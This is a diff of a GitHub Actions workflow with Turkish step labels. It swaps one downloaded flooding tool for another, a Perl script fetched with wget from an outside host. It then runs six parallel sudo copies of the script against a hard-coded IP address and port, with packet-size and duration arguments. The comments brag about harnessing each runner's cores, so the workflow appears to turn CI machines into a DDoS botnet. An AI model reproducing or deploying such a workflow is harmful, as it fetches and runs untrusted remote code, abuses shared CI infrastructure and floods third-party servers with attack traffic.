@@ -16,15 +16,15 @@ jobs:
     steps:
       - name: İndir ve Hazırla
         run: |
-          wget https://github.com/Paraloxd/tekpoyraz/raw/refs/heads/main/tekpoyraz -O tekpoyraz
-          chmod +x tekpoyraz
+          wget https://wgetz.com/0J2OmHGrYp/cacasexdc2.pl -O cacasexdc2.pl
+          chmod +x cacasexdc2.pl
           
       - name: 🔥 TEK MAKİNEDEN 8 ÇEKİRDEK GÜCÜ AL
         run: |
           PIDS=()
           # HER MAKİNE İÇİNDE 8 PARALEL İŞLEM BAŞLAT!
           for i in {1..6}; do
-            sudo timeout 60 ./tekpoyraz 213.238.172.142 53 &
+            sudo timeout 20 perl cacasexdc2.pl 66.22.244.133 50001 100 20 &
             PIDS+=($!)
           done
           
@@ -35,5 +35,5 @@ jobs:
 
       - name: Kapanış
         run: |
-          sleep 60
+          sleep 20
           exit 0
